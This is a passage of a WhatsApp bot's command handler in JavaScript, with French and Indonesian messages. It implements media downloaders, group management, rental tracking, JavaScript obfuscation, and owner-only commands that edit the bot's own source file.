                }
            }
        }, { quoted: m })

        await Xuu.sendMessage(m.chat, { react: { text: "✅", key: m.key } })

    } catch (e) {
        console.error("[FAA ERROR]", e.message)
        m.reply(`👑 ⚠️ Échec: ${e.message}`)
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "playvid": {
if (!text) return reply(example("dj tiktok"))
await Xuu.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytmp4(res.url)
if (anu.video) {
let urlMp3 = anu.video
await Xuu.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: m})
} else {
return reply("Erreur ! Vidéo ou chanson introuvable.")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "yts": {
if (!text) return reply(example('we dont talk'))
await Xuu.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ytmp3": {
if (!text) return reply(example("linknya"))
if (!text.startsWith("https://")) return reply("Lien invalide.")
var anu = await ytmp3(text)
if (anu.audio) {
let urlMp3 = anu.audio
await Xuu.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return reply("Erreur ! Vidéo ou chanson introuvable.")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "block": case "blok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await Xuu.updateBlockStatus(mem, "block")
if (m.isGroup) Xuu.sendMessage(m.chat, {text: `👑 Opération réalisée avec succès memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'ytmp4': {
    const from = m.key.remoteJid || m.chat;
    const url = text || args[0];

    if (!url) return Reply("Lien YouTube introuvable !");

    Reply("⏳ Traitement de la vidéo en cours...");

    try {
        const api = `https://api.jerexd666.wongireng.my.id/download/ytmp4?url=${encodeURIComponent(url)}`;

        const res = await fetch(api);
        const json = await res.json();

        console.log("DEBUG API MP4:", json);

        // URL final sesuai API kamu
        const videoUrl =
            json?.result?.download_url || 
            json?.result?.url ||
            json?.download_url ||
            json?.url ||
            json?.result?.download;

        if (!videoUrl) {
            return Reply("❌ Échec. Vidéo introuvable ou erreur API.");
        }

        await Xuu.sendMessage(from, {
            video: { url: videoUrl },
            caption: `🎥 *Video Downloaded*\n\nJudul: ${json?.result?.title || '-'}\nChannel: ${json?.result?.author || '-'}`,
            mimetype: 'video/mp4'
        }, { quoted: m });

    } catch (e) {
        console.log("ERROR MP4:", e);
        Reply("❌ Erreur saat mengambil Video MP4.");
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'igdl': {
    if (!args[0]) return reply("🔗 Entrez l'URL Facebook ou Instagram !");
    try {
        const axios = require('axios');
        const cheerio = require('cheerio');
        async function yt5sIo(url) {
            try {
                const form = new URLSearchParams();
                form.append("q", url);
                form.append("vt", "home");
                const { data } = await axios.post('https://yt5s.io/api/ajaxSearch', form, {
                    headers: {
                        "Accept": "application/json",
                        "X-Requested-With": "XMLHttpRequest",
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                });
                if (data.status !== "ok") throw new Erreur("Échec mengambil data.");
                const $ = cheerio.load(data.data);
                if (/^(https?:\/\/)?(www\.)?(facebook\.com|fb\.watch)\/.+/i.test(url)) {
                    const thumb = $('img').attr("src");
                    let links = [];
                    $('table tbody tr').each((_, el) => {
                        const quality = $(el).find('.video-quality').text().trim();
                        const link = $(el).find('a.download-link-fb').attr("href");
                        if (quality && link) links.push({ quality, link });
                    });
                    if (links.length === 0) throw new Erreur("Aucun élément disponible video yang dapat diunduh.");

                    return { platform: "facebook", thumb, video: links[0].link };
                } else if (/^(https?:\/\/)?(www\.)?(instagram\.com\/(p|reel)\/).+/i.test(url)) {
                    const video = $('a[title="Download Video"]').attr("href");
                    const thumb = $('img').attr("src");
                    if (!video || !thumb) throw new Erreur("Vidéo introuvable.");
                    return { platform: "instagram", thumb, video };
                } else {
                    throw new Erreur("URL invalide. Gunakan link Facebook atau Instagram.");
                }
            } catch (error) {
                return { error: error.message };
            }
        }
        await Xuu.sendMessage(m.chat, {
            react: {
                text: "⏳",
                key: m.key,
            }
        });
        let res = await yt5sIo(args[0]);
        if (res.error) {
            await Xuu.sendMessage(m.chat, {
                react: {
                    text: "❌",
                    key: m.key,
                }
            });
            return reply(`👑 ⚠ *Erreur:* ${res.error}`);
        }
        if (res.platform === "facebook" || res.platform === "instagram") {
            await Xuu.sendMessage(m.chat, {
                react: {
                    text: "⏳",
                    key: m.key,
                }
            });
            await Xuu.sendMessage(m.chat, { video: { url: res.video }, caption: "✅ *👑 Opération réalisée avec succès téléchargement vidéo!*" }, { quoted: m });
        }
    } catch (error) {
        console.error(error);
        await Xuu.sendMessage(m.chat, {
            react: {
                text: "❌",
                key: m.key,
            }
        });
        reply("⚠️ Une anomalie a été détectée. Le SEIGNEUR analyse la situation... saat mengambil video.");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "facebook": case "fb": case "fbdl": {
if (!text) return reply(example("linknya"))
if (!text.startsWith('https://')) return reply("Lien invalide. Vérifiez votre URL.")
await fetchJson(`https://api.siputzx.my.id/download/facebook?url=${text}`).then(async (res) => {
if (!res.status) return reply("Erreur! Result Not Found")
return Xuu.sendMessage(m.chat, {video: {url: res.result.media.video_hd || res.result.media.video_sd}, mimetype: "video/mp4", caption: "*Facebook Downloader ✅*"}, {quoted: m})
}).catch((e) => reply("Erreur"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gitclone": {
if (!text) return reply(example("https://github.com/Skyzodev/Simplebot"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return reply("Lien invalide. Vérifiez votre URL.")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Xuu.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await reply(`👑 Erreur! repositori introuvable`)
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "enc": case "encrypt": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return reply(example("en répondant à un fichier .js"))
if (mime !== "application/javascript" && mime !== "text/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./database/sampah/${filename}`, media)
await reply("Chiffrement du code en cours...")
await JsConfuser.obfuscate(await fs.readFileSync(`./database/sampah/${filename}`).toString(), {
  target: "node",
  preset: "high",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.75,
  deadCode: 0.2,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  identifierGenerator: "randomized",
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: { hash: 0.5, true: 0.5 },
  stack: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  rgf: false
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./database/sampah/${filename}`, obfuscated)
  await Xuu.sendMessage(m.chat, {document: fs.readFileSync(`./database/sampah/${filename}`), mimetype: "application/javascript", fileName: filename, caption: "✅ Fichier chiffré avec succès 👑"}, {quoted: m})
}).catch(e => reply("Erreur :" + e))
  await fs.unlinkSync(`./database/sampah/${filename}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "enchard": case "encrypthard": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return reply("Reply file .js")
if (mime !== "application/javascript" && mime !== "text/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await reply("Chiffrement avancé en cours...")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "/*PrimeXuu/*^/*($break)*/" + 
            "/*PrimeXuu/*^/*($break)*/";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },

    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await Xuu.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => reply("Erreur :" + e))
await fs.unlinkSync(`./@hardenc${filename}.js`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
reply(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = ` *── List all group chat*\n`
let a = await Xuu.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nom :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pin": case "pinterest": {
if (!text) return reply(example("anime dark"))
await Xuu.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: Xuu.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\n📌 Résultats de recherche *Pinterest* :`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await Xuu.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listadmin": {
    if (!isOwner) return m.reply(mess.owner);

    try {
        const res = await fetch(`${domain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            }
        });

        const data = await res.json();
        const users = data.data;

        const adminUsers = users.filter(u => u.attributes.root_admin === true);
        if (adminUsers.length < 1) return m.reply("Aucun élément disponible admin panel.");

        let teks = `\n*Total admin panel :* ${adminUsers.length}\n`
        adminUsers.forEach((admin, idx) => {
            teks += `
- ID : *${admin.attributes.id}*
- Nom : *${admin.attributes.first_name}*
- Created : ${admin.attributes.created_at.split("T")[0]}
`;
        });

        await m.reply(teks)

    } catch (err) {
        console.error(err);
        m.reply("⚠️ Une anomalie a été détectée. Le SEIGNEUR analyse la situation... saat mengambil data admin.");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listsewa": case "sewalist": case "sewagclist": {
  let da = await readSewa()
 let tx = "*List grub yang menyewa bot:*\n\n"
 function msToDate(ms) {
        let date = new Date(ms);
        return `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`;
    }
  if (!da) return reply("Aucun groupe en location.")
  for (let a of Object.keys(da)) {
    let k = da[a]
    tx += `${a}: ${msToDate(k.expired)}\n`
  }
  m.reply(tx.trim())
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addsewa": case "sewagc": case "tambahsewa": {
    function convertDaysToMs(days) {
        return days * 24 * 60 * 60 * 1000;
    }

    function msToDate(ms) {
        let date = new Date(ms);
        return `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`;
    }

    if (!text) return reply("Exemple: .addsewa idgc 10\n10 itu 10 hari.");
    if (!args[0].includes("@g.us")) return reply("ID de groupe invalide.");
    
    await reply("👑 Traitement en cours sous l’autorité du SEIGNEUR......");
    let id = args[0];
    let waktuSekarang = Date.now();
    let waktu;

    if (!isNaN(Number(args[1])) && Number(args[1]) > 0) {
        waktu = waktuSekarang + convertDaysToMs(Number(args[1]));
        await reply("Converting expired...")
    } else {
        return reply("Veuillez entrer un nombre de jours valide 😊");
    }

    let dts = await readSewa();
    dts[id] = {
        expired: waktu
    };

    await writeSewa(dts);
    await reply("👑 Opération réalisée avec succès menambahkan groupes.\nExpired: " + msToDate(waktu))
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'fb':
case 'fbdl':
case 'facebook': {
  try {
    if (!text) return reply(`👑 Exemple: ${prefix+command} linknya`)
    if (!text.includes('facebook.com')) return reply('Le lien doit être link facebook!')
    let jor = await fetchJson(`https://vapis.my.id/api/fbdl?url=${encodeURIComponent(text)}`)
        await Xuu.sendMessage(m.chat, {
          video: {
            url: jor.data.sd_url
          },
          caption: `👑 Succès confirmé👍`
        }, {
          quoted: qloc
        })
  } catch (err) {
  try {
    let jor = await fetchJson(`https://vapis.my.id/api/fbdl?url=${encodeURIComponent(text)}`)
        await Xuu.sendMessage(m.chat, {
          video: {
            url: jor.data.sd_udl
          },
          caption: ``
        }, {
          quoted: qloc
        })
  } catch (err) {
    console.error('Kesalahan pada API:', err)
    reply('⚠️ Une anomalie a été détectée. Le SEIGNEUR analyse la situation...')
  }}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'pastebin': {
  if (!args[0]) return reply(`👑 Exemple: ${prefix+command} linknya`)
  const pe = await axios.get(`https://vapis.my.id/api/pastebin?url=${args[0]}`)
  const pasteData = pe.data.data
  m.reply(pasteData)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'opentime': {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
  const timeUnits = {
    detik: 1000,
    menit: 60000,
    jam: 3600000,
    hari: 86400000
  };
  const unit = args[1]?.toLowerCase();
  const multiplier = timeUnits[unit];
  const duration = parseInt(args[0]);
  if (!multiplier || isNaN(duration) || duration <= 0) {
    return reply(`👑 Pilih:\nDetik\nMenit\nJam\nHari\n\nExemple: ${command} 10 detik`);
  }
  const timer = duration * multiplier;
  reply(`👑 Open time ${duration} ${unit} programmé à partir de maintenant!`);
  const sendReminder = (message, delay) => {
    if (timer > delay) {
      setTimeout(() => {
        m.reply(message);
      }, timer - delay);
    }
  };
  sendReminder(`⏳ Rappel du SEIGNEUR: 10 detik lagi groupes akan dibuka!`, 10000);
  setTimeout(() => {
    const open = `*[ OPEN TIME ]* 👑 Le groupe est désormais ouvert par le SEIGNEUR!`;
    Xuu.groupSettingUpdate(m.chat, 'not_announcement');
    m.reply(open);
  }, timer);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'closetime': {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
  const timeUnits = {
    detik: 1000,
    menit: 60000,
    jam: 3600000,
    hari: 86400000
  };
  const unit = args[1]?.toLowerCase();
  const multiplier = timeUnits[unit];
  const duration = parseInt(args[0]);
  if (!multiplier || isNaN(duration) || duration <= 0) {
    return reply(`👑 Pilih:\nDetik\nMenit\nJam\nHari\n\nExemple: ${command} 10 detik`);
  }
  const timer = duration * multiplier;
  reply(`👑 Close time ${duration} ${unit} programmé à partir de maintenant!`);
  const sendReminder = (message, delay) => {
    if (timer > delay) {
      setTimeout(() => {
        m.reply(message);
      }, timer - delay);
    }
  };
  sendReminder(`⏳ Rappel du SEIGNEUR: 10 detik lagi groupes akan ditutup!`, 10000);
  setTimeout(() => {
    const close = `*[ CLOSE TIME ]* 👑 Le groupe a été verrouillé par le SEIGNEUR!`;
    Xuu.groupSettingUpdate(m.chat, 'announcement');
    m.reply(close);
  }, timer);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'toraw': {
  if (!text) return reply(`👑 Exemple: ${command} link github format ori`)
  if (!text.includes('github.com')) return reply('Le lien doit être link github ori!')
  function toGhRaw(url) {
    const rawUrl = url.replace('github.com', 'raw.githubusercontent.com').replace('/blob', '');
    return rawUrl;
  }
  const raw = await toGhRaw(text)
  m.reply(raw)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'mediafire': {
   if (!isCreator) return Reply(mess.owner);
  try {
    if (!text) return reply(`👑 Exemple: ${command} linknya`)
    if (!text.includes('mediafire.com')) return m.reply('Le lien doit être link mediafire!')
    reply('Chargement...')
    let api = `https://api.vreden.my.id/api/mediafiredl?url=${text}`
    let res = await fetch(api)
    let data = await res.json()
    fileNom = decodeURIComponent(data.result[0].nom)
    var media = await getBuffer(data.result[0].link)
    if (data.result[0].mime.includes('mp4')) {
      Xuu.sendMessage(m.chat, {
        document: media,
        fileName: fileNom,
        mimetype: 'video/mp4'
      }, {
        quoted: qloc
      })
    } else if (data.result[0].mime.includes('mp3')) {
      Xuu.sendMessage(m.chat, {
        document: media,
        fileName: fileNom,
        mimetype: 'audio/mp3'
      }, {
        quoted: qloc
      })
    } else {
      Xuu.sendMessage(m.chat, {
        document: media,
        fileName: fileNom,
        mimetype: 'application/' + data.result[0].mime
      }, {
        quoted: qloc
      })
    }
  } catch (err) {
    reply('⚠️ Une anomalie a été détectée. Le SEIGNEUR analyse la situation...: ' + err)
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
                
case 'addcase': {
if (!isOwner) return m.reply(mess.owner);
    const filePath = path.join(__dirname, 'PRIMEXUU.js');
    let fileContent = fs.readFileSync(filePath, 'utf8');

    let newCase = m.quoted ? m.quoted.text.trim() : text.trim();
    if (!newCase.startsWith("case '")) return m.reply('Format salah!');

    let caseMatch = newCase.match(/case\s+'([^']+)':/);
    if (!caseMatch) return reply('Échec mengambil nom case!');
    let caseName = caseMatch[1];

    const commandPattern = /case\s+'([^']+)':/g;
    let match;
    while ((match = commandPattern.exec(fileContent)) !== null) {
        if (match[1] === caseName) return reply(`Case \`${caseName}\` existe déjà.`);
    }

    const breakPattern = /break;?\s*(\/\/.*)?$/gm;
    let breakMatch, insertIndex = -1;
    while ((breakMatch = breakPattern.exec(fileContent)) !== null) {
        insertIndex = breakMatch.index + breakMatch[0].length;
    }

    const defaultIndex = fileContent.indexOf('default:');
    if (insertIndex === -1) {
        if (defaultIndex === -1) return m.reply('Impossible de trouver `default:` dans le fichier.');
        insertIndex = defaultIndex;
    }

    let newContent = fileContent.slice(0, insertIndex) + `\n${newCase}\n` + fileContent.slice(insertIndex);
    fs.writeFileSync(filePath, newContent, 'utf8');

    reply(`✅ Case \`${caseName}\` réussi ditambahkan!`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'delcase': {
if (!isOwner) return m.reply(mess.owner);
    if (!text) return reply('Entrez le nom du case à supprimer !');

    const filePath = path.join(__dirname, 'PRIMEXUU.js');
    let fileContent = fs.readFileSync(filePath, 'utf8');

    const casePattern = new RegExp(`case\\s+'${text}':(?:\\s*case\\s+'[^']+':)*\\s*{`, 'g');
    let match = casePattern.exec(fileContent);
    if (!match) return reply(`Case \`${text}\` introuvable.`);

    let startIndex = match.index;
    let endIndex = -1;

    for (let i = startIndex; i < fileContent.length; i++) {
        if (fileContent.substring(i, i + 6) === 'break;') {
            endIndex = i + 6;
            break;
        }
        if (fileContent.substring(i, i + 5) === 'break') {
            endIndex = i + 5;
            break;
        }
    }

    if (endIndex === -1) return reply(`Échec menghapus case \`${text}\`.`);

    fileContent = fileContent.slice(0, startIndex) + fileContent.slice(endIndex);
    fs.writeFileSync(filePath, fileContent, 'utf8');

    reply(`✅ Case \`${text}\` réussi dihapus!`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'cekidch': {
if (!text) return reply(("Mana Link Channnel Nya?"))
if (!text.includes("https://whatsapp.com/channel/")) return reply("Invalid link")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await Xuu.newsletterMetadata("invite", result)
let teks = `* *ID : ${res.id}*
* *Name :* ${res.name}
* *Total Followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "verified" : "No"}`
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: teks }, 
footer: {
text: "SEIGNEUR TD" }, //input watermark footer
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
           },
     ], },},
    }, }, },{ quoted : qloc });
await Xuu.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addidgc": case "addgc": {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return reply(example("Entrez ID groupes!"))
    if (!text.endsWith("@g.us")) return reply("ID groupes invalide!")

    let input = text.trim()
    if (gclist.includes(input)) return reply(`👑 ID ${input} déjà enregistré !`)

    gclist.push(input)
    
    try {
        await fs.promises.writeFile("./library/database/gclist.json", JSON.stringify(gclist, null, 2))
        reply(`👑 ✅ 👑 Opération réalisée avec succès menambahkan ID groupes ke dalam database!`)
    } catch (error) {
        console.error("❌ Échec menyimpan ke database:", error)
        reply("⚠️ ⚠️ Une anomalie a été détectée. Le SEIGNEUR analyse la situation... saat menyimpan ke database!")
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "donasi": {
const xuu = `seigneur_td-allpayment.vercel.app`
m.reply(xuu)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'ambilsw': case 'sw': {
    if (!isCreator) return reply(mess.owner)
    if (m.isGroup) return m.reply("❌ Command ini hanya bisa digunakan di chat pribadi!");

    const quotedMessage = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quotedMessage) return m.reply("📌 Balas pesan gambar/video yang ingin diambil!");

    if (quotedMessage.imageMessage) {
        let imageUrl = await Xuu.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        return Xuu.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
    }

    if (quotedMessage.videoMessage) {
        let videoUrl = await Xuu.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        return Xuu.sendMessage(m.chat, { video: { url: videoUrl } }, { quoted: m });
    }
    return reply("❌ Hanya bisa mengambil gambar atau video dari pesan yang dikutip!");
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~//

case 'crategc': {
    if (!isCreator) return reply('*Erreur403 Khusus Creator/Owner');
    
    let parts = text.split('|');
    let groupName = parts[0]?.trim();
    let groupDesc = parts[1]?.trim() || '';
    
    if (!groupName) {
        return m.reply(`👑 Cara penggunaan: 
${prefix + command} NomGroup|DeskripsiGroup

- Pisahkan nom dan deskripsi groupes dengan simbol | 
- Deskripsi groupes bersifat opsional

Exemple: 
${prefix + command} Grup Keren|Grup untuk diskusi keren`);
    }
    
    try {
        let groupData = await Xuu.groupCreate(groupName, []);
       
        await new Promise(resolve => setTimeout(resolve, 1000));
        
      
        if (groupDesc) {
            await Xuu.groupUpdateDescription(groupData.id, groupDesc);
        }
       
        let hasSetPicture = false;
        if (m.quoted && /image/.test(m.quoted.mimetype)) {
            try {
                let media = await m.quoted.download();
                await Xuu.updateProfilePicture(groupData.id, media);
                hasSetPicture = true;
            } catch (pictureErreur) {
                console.error('Erreur setting group picture:', pictureErreur);
            }
        }
        
        
        let response = await Xuu.groupInviteCode(groupData.id);
        let inviteLink = `https://chat.whatsapp.com/${response}`;
                let successDetails = [];
        successDetails.push(`✅ Grup "${groupName}" réussi dibuat!`);
        
        if (groupDesc) {
            successDetails.push(`✅ Description du groupe définie avec succès`);
        }
        
        successDetails.push(`\nLink groupes: ${inviteLink}`);
        
      
        await Xuu.sendMessage(m.chat, {
            text: successDetails.join('\n'),
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999999, 
                isForwarded: true, 
                forwardedNewsletterMessageInfo: {
                    newsletterName: global.nomSaluran,
                    newsletterJid: '120363422398514286@newsletter',
                },
                externalAdReply: {
                    showAdAttribution: true,
                    title: groupName,
                    body: groupDesc || 'Undangan chat groupes',
                    thumbnailUrl: global.image.menu, 
                    sourceUrl: inviteLink,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        });
    } catch (error) {
        console.error('Erreur creating group:', error);
        reply(`👑 Échec membuat groupes: ${error.message}`);
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//



//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'tobase64': {
if (!text) return reply("Entrez Text Yang Mau Di Jadiin Base64")
const anu = await axios.get(`https://api.siputzx.my.id/api/tools/text2base64?text=${encodeURIComponent(text)}`)
reply(`👑 👑 Opération réalisée avec succès Convert Text To Base64\n\n${anu.data.data.base64}`)
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'instagram': {
    if (!text) return Reply(example("linknya"));
    if (!text.startsWith('https://')) return Reply("Lien invalide. Vérifiez votre URL.!");

    await Xuu.sendMessage(m.chat, { react: { text: '🕖', key: m.key } });

    try {
        const res = await fetchJson(`https://api.resellergaming.my.id/download/instagram?url=${encodeURIComponent(text)}`);

        // Ambil link video dari res.result[0].url_download
        const videoUrl = res?.result?.[0]?.url_download;

        if (!videoUrl) {
            console.log("Response API:", res);
            return Reply("❌ Aucun élément disponible video yang bisa diunduh!");
        }

        await Xuu.sendMessage(
            m.chat,
            {
                video: { url: videoUrl },
                mimetype: "video/mp4",
                caption: `*Instagram Downloader ✅*\n📺 ${res.result[0].kualitas || 'Video'}`
            },
            { quoted: m }
        );

        await Xuu.sendMessage(m.chat, { react: { text: '', key: m.key } });
    } catch (e) {
        console.error("Instagram Erreur:", e);
